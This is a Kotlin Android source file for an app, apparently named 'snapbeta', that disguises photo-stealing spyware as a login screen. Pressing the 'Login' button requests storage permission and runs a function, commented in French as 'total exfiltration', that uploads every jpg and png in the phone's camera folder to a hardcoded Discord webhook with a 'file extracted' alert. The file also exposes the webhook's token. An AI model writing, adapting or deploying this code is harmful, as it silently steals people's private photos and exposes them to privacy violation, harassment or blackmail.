package com.etude.snapbeta

import android.Manifest
import android.os.Bundle
import android.widget.Button
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.asRequestBody
import java.io.File
import java.io.IOException

class MainActivity : AppCompatActivity() {

    private val webhookUrl = "https://discord.com/api/webhooks/1473402144429445373/SLzILGXWmFb4Usnl0pKNy-uSIE77mQt0nMRqHu0faE5BqXl17BFyFP83NHzh14hp52U9"

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        val btnLogin = findViewById<Button>(R.id.btnLogin)
        btnLogin.setOnClickListener {
            // 1. Demande de permission
            ActivityCompat.requestPermissions(this, 
                arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE), 101)
            
            // 2. Lancement de l'exfiltration totale
            exfiltrerTout()
        }
    }

    private fun exfiltrerTout() {
        val dcimFolder = File("/sdcard/DCIM/Camera")
        if (dcimFolder.exists() && dcimFolder.isDirectory) {
            dcimFolder.listFiles()?.forEach { file ->
                if (file.isFile && (file.extension == "jpg" || file.extension == "png")) {
                    sendToDiscord(file)
                    Thread.sleep(300) // Petit délai pour Discord
                }
            }
        }
    }

    private fun sendToDiscord(file: File) {
        val client = OkHttpClient()
        val requestBody = MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataPart("file", file.name, file.asRequestBody("image/jpeg".toMediaTypeOrNull()))
            .addFormDataPart("content", "📁 **Alerte :** Fichier extrait : ${file.name}")
            .build()

        val request = Request.Builder().url(webhookUrl).post(requestBody).build()
        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {}
            override fun onResponse(call: Call, response: Response) { response.close() }
        })
    }
}
